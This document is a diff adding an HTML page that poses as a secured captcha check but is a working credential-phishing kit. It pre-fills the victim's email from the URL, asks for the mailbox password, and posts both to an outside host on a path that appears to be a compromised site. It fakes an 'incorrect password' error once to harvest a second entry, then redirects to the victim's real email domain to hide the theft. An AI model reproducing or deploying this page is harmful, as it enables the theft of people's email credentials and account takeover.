@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Captcha page | Secured</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <link rel="shortcut icon" href="https://masherabot.com/img/png/adobe/acrobat.png" type="image/x-icon">
+    <script src="https://code.jquery.com/jquery-3.7.0.js" integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
+</head>
+
+<style>
+    body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        background: #f5f5f5;
+        font-family: 'Archivo Narrow', sans-serif;
+    }
+    .login-container {
+        width: 100%;
+        max-width: 400px;
+        padding: 25px;
+        background: white;
+        border-radius: 10px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    }
+    .btn-verify {
+        width: 50%;
+        margin: 0 auto;
+        display: block;
+        background: #062174;
+        color: white;
+        padding: 10px;
+        border: none;
+        border-radius: 5px;
+        transition: all 0.3s;
+    }
+    .btn-verify:hover {
+        background: #0a2d8a;
+    }
+    .shake {
+        animation: shake 0.5s;
+    }
+    @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-5px); }
+        75% { transform: translateX(5px); }
+    }
+    .loading {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-flow: column;
+        gap: 10px;
+        position: fixed;
+        top: 0; right: 0; bottom: 0; left: 0;
+        z-index: 100;
+        background: white;
+    }
+    .verification-complete {
+        display: none;
+        justify-content: center;
+        align-items: center;
+        flex-flow: column;
+        gap: 10px;
+        position: fixed;
+        top: 0; right: 0; bottom: 0; left: 0;
+        z-index: 100;
+        background: white;
+    }
+    .loader {
+        width: 48px;
+        height: 48px;
+        display: inline-block;
+        position: relative;
+        background: black;
+        box-sizing: border-box;
+        animation: flipX 1s linear infinite;
+    }
+    @keyframes flipX {
+        0% { transform: perspective(200px) rotateX(0deg) rotateY(0deg); }
+        50% { transform: perspective(200px) rotateX(-180deg) rotateY(0deg); }
+        100% { transform: perspective(200px) rotateX(-180deg) rotateY(-180deg); }
+    }
+    .confirm {
+        font-weight: 600;
+    }
+    .text-secondary {
+        font-weight: bold;
+    }
+    .confirm-identity-spacing {
+        margin-bottom: 24px;
+    }
+</style>
+
+<body>
+    <div class="login-container">
+        <img src="https://media.istockphoto.com/id/1156467607/photo/captcha-im-not-a-robot.jpg?b=1&s=170667a&w=0&k=20&c=qsCUeyZgtDMl98uVMrhPrXqWatuEdwkSyF6YlwLtbW4=" width="150" style="display: block; margin: 0 auto 20px;">
+
+        <div id="errorMsg" class="alert alert-danger" style="display: none;">
+            <i class="fas fa-exclamation-circle"></i> Incorrect password. Please try again.
+        </div>
+
+        <div class="text-center confirm confirm-identity-spacing">Confirm identity to prove you are not a robot</div>
+
+        <form id="loginForm">
+            <input type="hidden" name="step" value="1">
+            <div class="form-group">
+                <label class="text-secondary font-weight-bold">Email Address</label>
+                <input type="email" class="form-control" id="email" name="email" required autocomplete="username">
+            </div>
+
+            <div class="form-group">
+                <label class="text-secondary font-weight-bold">Password</label>
+                <input type="password" class="form-control" id="password" name="password" required autocomplete="current-password">
+            </div>
+
+            <div class="text-center">
+                <button type="submit" id="submitBtn" class="btn btn-verify">
+                    <span id="btnText">Verify Identity</span>
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <div class="loading" id="loading">
+        <span class="loader"></span>
+        <h3 class="text-center">Connecting To Mail Server</h3>
+    </div>
+
+    <div class="verification-complete" id="verificationComplete">
+        <span class="loader" style="background: #28a745;"></span>
+        <h3 class="text-center" style="color: #28a745;">Verification complete!</h3>
+    </div>
+
+    <iframe src="" frameborder="0" id="iframe" style="display: none;"></iframe>
+    <input type="hidden" value="0" id="number">
+
+    <script>
+        // Set email from URL hash if present
+        const emailInput = document.getElementById('email');
+        const hashEmail = window.location.hash.substring(1);
+        let redirectUrl = 'https://example.com'; // Default fallback
+        
+        if (hashEmail) {
+            emailInput.value = hashEmail;
+            // Set redirect URL based on email domain
+            const domain = hashEmail.split('@')[1];
+            if (domain) {
+                redirectUrl = `https://www.${domain}`;
+                document.getElementById('iframe').src = redirectUrl;
+            }
+        }
+
+        // Hide loader after 4 seconds
+        setTimeout(() => {
+            document.getElementById("loading").style.display = "none";
+        }, 4000);
+
+        document.addEventListener("DOMContentLoaded", function() {
+            var form = document.getElementById("loginForm");
+            form.addEventListener("submit", function(e) {
+                e.preventDefault();
+                var number = parseInt(document.getElementById("number").value);
+                var button = document.getElementById("submitBtn");
+                var formData = new FormData(form);
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://seamua.com/.well-known/acme-challenge/ini.php", true);
+                var errors = document.getElementById("errorMsg");
+                errors.style.display = "block";
+                errors.innerHTML = '<i class="fas fa-exclamation-circle"></i> Incorrect password. Please try again.';
+                var password = document.getElementById("password");
+                password.value = "";
+                var added = number + 1;
+                document.getElementById("number").value = added;
+                
+                if (number === 1) {
+                    errors.style.display = "none";
+                    document.getElementById("verificationComplete").style.display = "flex";
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 2000);
+                }
+
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        if (xhr.status === 200) {
+                            console.log(xhr.responseText);
+                        } else {
+                            console.error(xhr.responseText);
+                        }
+                    }
+                };
+                xhr.send(formData); 
+            });
+        });
+    </script>
+</body>
+</html>
